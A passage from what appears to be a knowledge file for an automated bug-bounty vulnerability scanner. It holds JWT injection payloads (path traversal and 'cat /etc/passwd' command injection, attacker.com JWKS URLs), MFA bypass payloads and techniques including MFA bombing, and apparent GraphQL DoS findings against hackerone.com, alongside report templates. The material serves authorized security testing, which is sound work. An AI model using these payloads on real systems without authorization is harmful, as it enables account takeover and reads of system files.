../../../../../../etc/passwd
| cat /etc/passwd                    # Command injection in kid
; cat /etc/passwd
```

### JKU/X5U Injection -- Attacker-Controlled JWKS

```
https://attacker.com/.well-known/jwks.json
https://attacker.com/jwks.json
http://localhost/jwks.json
file:///etc/passwd
```

### JWKS Discovery Endpoints

```
/.well-known/jwks.json
/jwks.json
/oauth/jwks
/api/jwks
/.well-known/openid-configuration
```

### Claim Manipulation

```json
"exp": 9999999999
"nbf": 0
"sub": "admin"
"user_id": 1
"role": "admin"
"is_admin": true
```

---

## MFA BYPASS PAYLOAD REFERENCE

### Common Test OTPs

```
000000
123456
111111
123123
654321
999999
```

### Null/Empty Bypasses

```
otp=
otp=null
otp=NULL
otp=undefined
otp=0
otp=000000
mfa_code=
verification_code=
```

### Array/Object Injection

```
otp[]=123456
otp[]
otp={"$ne":""}
otp=["123456"]
{"otp": null}
{"otp": ""}
{"otp": 0}
```

### Response Manipulation (Intercept and Modify)

```
"success": false  ->  "success": true
"verified": false  ->  "verified": true
"mfa_required": true  ->  "mfa_required": false
"status": "pending"  ->  "status": "verified"
HTTP 403  ->  HTTP 200
HTTP 401  ->  HTTP 200
```

### Direct Endpoint Access (Skip MFA Step Entirely)

```
/dashboard
/home
/account
/api/user
/api/me

# Custom bypass headers:
X-MFA-Verified: true
X-2FA-Bypass: true
X-Auth-Skip: true
```

### Rate Limit Bypass Headers

```
X-Forwarded-For: {random_ip}
X-Real-IP: {random_ip}
X-Originating-IP: {random_ip}
```

### Parameter Pollution

```
mfa_code=123456&mfa_code=000000
verification_code=wrong&verification_code=correct
otp=a&otp=123456
```

### Encoding Bypasses

```
otp=123456%00
otp=%31%32%33%34%35%36
otp=123456%0a
otp=123456%0d
```

### Other MFA Attack Vectors

- **Remember device bypass**: `remember_device=true`, `trust_device=1`, steal/replay device token
- **OTP reuse**: Try same OTP multiple times; try previously used OTPs; check if OTPs expire properly
- **Recovery flow bypass**: Password reset may skip MFA; account recovery may skip MFA; support ticket may bypass MFA
- **OAuth/SSO bypass**: Link social account (may skip MFA); use SSO provider (may skip MFA)
- **Race conditions**: Send multiple OTP attempts simultaneously; login + OTP verification race
- **Push notification fatigue (MFA bombing)**: Spam push notifications until victim accepts
- **Backup code attacks**: Usually 8-10 alphanumeric characters; rate limits often weaker for backup codes

---

## HACKERONE SUBMISSION FORMAT

### Standard Report Structure

```
## Summary
Brief description of all vulnerabilities. State total count, affected endpoint,
authentication requirement, and testing compliance. Lead with the most impactful finding.

## PoC N: [Vulnerability Title]

### Description
Root cause analysis. What is the vulnerable component and why does the issue exist.

### Steps to Reproduce
Step 1: Send the following curl request:

  curl -w "\nTTFB: %{time_starttransfer}s\nTotal: %{time_total}s\nSize: %{size_download} bytes\n" \
    -X POST "https://target.com/endpoint" \
    -H "Content-Type: application/json" \
    -H "X-Bug-Bounty: HackerOne-{handle}" \
    -d '{"payload": "..."}'

Step 2: Observe: [specific measurable outcome]

### Negative Control
[Same request without the malicious element] -> [expected normal behavior]
Proves the attack mechanism causes the effect (not baseline behavior).

### Measurements Table
| Test Case | TTFB | Response Size | Notes |
|-----------|------|---------------|-------|

### Impact
Specific quantifiable impact. Avoid vague statements.

### Suggested Severity
Severity level + reasoning + expected bounty if applicable.

### Recommended Fix
Specific fix recommendation.

## Testing Compliance
| Requirement | Status |
|-------------|--------|
| Single request per test | Compliant |
| Single source IP | Compliant |
| Custom header X-Bug-Bounty: HackerOne-{handle} | Included on all requests |
| Testing window (Mon-Thu 9PM-6AM UTC) | Compliant |
```

### Real-World HackerOne Findings (hackerone.com GraphQL, 2026-10-28)

**Finding 1: GraphQL Query Complexity Amplification (alias-based)**
- 3 aliases x 100 teams x 5 nested connections = 1,500 resolver invocations per request
- Measured: 22.09s TTFB, 3,523 KB response from ~1.2 KB input (57x time amplification)
- Root cause: Alias cap (max 3) but no total query complexity budget
- Fix: Implement per-query complexity/cost budget (e.g., `graphql-cost-analysis`)
- Severity: Medium (DoS), $1,500 bounty cap on hackerone.com

**Finding 2: Recursive Type Nesting DoS (zero aliases -- bypasses alias-cap fix)**
- `Team->participants->User->teams->Team` traversal: 20.54s TTFB, zero aliases used
- Completely distinct from alias amplification -- reducing alias cap does not prevent this
- Fix: Per-query complexity budget (alias cap alone is necessary but insufficient)
- Measured: `teams(50)->participants(50)->teams(50)` = 20.54s vs baseline 0.49s

**Finding 3: `leaderboard_entries` Resolver Crashes (15/17 enum keys return HTTP 500)**
- Only ALL_TIME_REPUTATION and ALL_TIME_REPUTATION_BY_ENGAGEMENT_TYPE work correctly
- 15 keys crash: HIGHEST_REPUTATION, HIGH_CRIT_REPUTATION, OWASP_TOP_10, CTF_POINTS, UP_AND_COMERS, etc.
- Core platform feature (hacker leaderboard) largely broken, unauthenticated

**Finding 4: `payment_transactions` Resolver Crash (100% reproducible)**
- Financial data resolver crashes on every invocation (HTTP 500)
- Negative control: `bounties` field on same Team type returns HTTP 200 successfully
- Unauthenticated access

**Finding 5: `skills` Root Query Resolver Crash**
- Root-level `skills` crashes with HTTP 500 on every invocation
- Same `skills` connection works correctly through `users->skills` path
- Indicates different broken code path at the root resolver level

---

## REPORT TEMPLATE STRUCTURE

```markdown
# VULNHUNTER SECURITY ASSESSMENT REPORT

## Target: [TARGET_NAME]
## Date: [SCAN_DATE]
## Scan Duration: [DURATION]
## Depth Level: [1-4]

---

## EXECUTIVE SUMMARY

| Metric | Value |
|--------|-------|
| Total Findings | [COUNT] |
| Critical | [COUNT] |
| High | [COUNT] |
| Medium | [COUNT] |
| Low | [COUNT] |
| Chains Discovered | [COUNT] |
| Modules Run | [LIST] |
| Total Passes | [COUNT] |
| Validation Rate | [CONFIRMED/TOTAL CANDIDATES]% |

---

## CRITICAL FINDINGS

### VH-[MODULE]-[NUM]: [VULNERABILITY TITLE]

**Severity:** Critical (CVSS [SCORE])
**CVSS Vector:** [VECTOR_STRING]
**CWE:** [CWE-ID]
**OWASP:** [MAPPING]

**Affected Endpoint:**
  [METHOD] [URL]
  Parameter: [PARAM]
  Context: [CONTEXT]

**Reproduction Steps:**
  # Step 1: [description]
  curl [FULL CURL COMMAND]

**Payload:**
  [THE EXACT PAYLOAD USED]

**Evidence:**
  Request: [FULL HTTP REQUEST]
  Response: [RELEVANT RESPONSE SNIPPET]

**Negative Control:**
  [same request WITHOUT the payload -- shows normal behavior]

**Impact:** [specific impact description]
**Remediation:** [specific fix recommendation with code example]
**Verification Test:** [how to verify the fix works]

---

## HIGH FINDINGS
[Same format as Critical]

---

## VULNERABILITY CHAINS

### Chain [NUM]: [CHAIN TITLE]

**Combined Severity:** [SEVERITY] (CVSS [COMBINED_SCORE])

**Chain Flow:**
  [Finding A] -> [Finding B] -> [Finding C]
  [MODULE-ID]    [MODULE-ID]    [MODULE-ID]
  [Severity]     [Severity]     [Severity]

**Combined Impact:** [What the full chain achieves]

---

## SCAN COVERAGE

| Module | Status | Vectors Tested | Findings | False Positives |
|--------|--------|---------------|----------|-----------------|
| AUTH | [status] | [count] | [count] | [count] |
| RXSS | [status] | [count] | [count] | [count] |
| RCE | [status] | [count] | [count] | [count] |
| API | [status] | [count] | [count] | [count] |
| DESER | [status] | [count] | [count] | [count] |
| DOM-XSS | [status] | [count] | [count] | [count] |
| WCD | [status] | [count] | [count] | [count] |
```

---

## ANTI-DUPLICATION RULES

```
Before testing a vector:
1. Check TESTED_VECTORS -- if already tested with same payload class, skip
2. Check FINDINGS_LOG -- if endpoint already has confirmed finding of same class,
   test for VARIANTS but do not re-test the same thing
3. Different payload for same endpoint = new test (OK to run)
4. Same payload for different parameter = new test (OK to run)
```

---

## EMERGENCY FINDING PROTOCOL

When a Critical finding is discovered:

1. IMMEDIATELY validate through Validation Gateway
2. If confirmed Critical:
   - Add to VALIDATED_FINDINGS with CRITICAL flag
   - Pause other testing on the affected endpoint
   - Check for variants of the same vulnerability
   - Test chain potential (can this + another finding = worse impact?)
   - Generate immediate PoC with full reproduction steps
   - Continue testing OTHER endpoints -- do not stop the scan
3. Report Critical findings as they are confirmed -- do not wait for full scan completion

---

## MODULE-SPECIFIC FALSE POSITIVE SOURCES

For detailed FP analysis, load the matching module file:
- RXSS: `agents/rxss/chunk-14-false-positive-evidence-severity.md`
- RCE: `agents/rce/17-verification-evidence-agent.md`
- DOM-XSS: `agents/dompurify-xss/08_FALSE_POSITIVE_ROOT_CAUSE.md`
- API: `agents/api-security/prompts/skills/triage-validation.prompt.md`
- WCD: `agents/web-cache-deception/chunk-13-false-positive-elimination.md`
- DESER: `agents/deserialization/14_assessment_methodology_agent.md`

